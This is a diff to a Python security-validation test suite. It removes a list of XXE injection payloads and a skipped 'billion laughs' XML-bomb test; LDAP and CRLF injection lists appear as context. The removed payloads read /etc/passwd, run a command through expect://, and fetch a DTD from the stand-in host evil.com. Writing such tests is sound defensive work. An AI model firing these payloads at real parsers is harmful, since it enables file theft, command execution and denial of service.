@@ -134,15 +134,6 @@ class TestSecurityValidation:
         "*))%00",
     ]
 
-    # XXE Injection Vectors
-    XXE_PAYLOADS = [
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
-        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>',
-        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo/>',
-    ]
-
     # CRLF Injection Vectors
     CRLF_INJECTION_PAYLOADS = [
         "value\r\nSet-Cookie: admin=true",
@@ -1277,35 +1268,6 @@ class TestSecurityValidation:
                 logger.debug(f"  Payload {i + 1} accepted (no dangerous pattern matched)")
             except ValidationError:
                 logger.debug(f"  Payload {i + 1} rejected (validation failed)")
-
-    @pytest.mark.skip(reason="Currently not applicable, XML parsing not used")
-    def test_billion_laughs_attack(self):
-        """Test XML entity expansion attack prevention."""
-        logger.debug("Testing billion laughs attack")
-
-        # Helper function
-        def must_fail(content: str, mime: str, label: str = "XML bomb") -> None:
-            """Ensure that XML bomb content raises ValidationError."""
-            try:
-                ResourceCreate(uri="test.xml", name="XML Resource", content=content, mime_type=mime)
-            except ValidationError as err:
-                print(f"✅ {label} correctly rejected -> {err}")
-            else:
-                print(f"❌ {label} passed but should have failed")
-                pytest.fail(f"{label} accepted although it contains dangerous XML")
-
-        # This would be relevant if XML parsing is involved
-        xml_bomb = """<?xml version="1.0"?>
-        <!DOCTYPE lolz [
-        <!ENTITY lol "lol">
-        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-        ]>
-        <lolz>&lol3;</lolz>"""
-
-        # Should be caught as dangerous content
-        logger.debug("Testing XML bomb in resource content")
-        must_fail(xml_bomb, "application/xml", "Billion laughs XML bomb")
 
     def test_prototype_pollution_prevention(self):
         """Test prevention of prototype pollution attacks."""
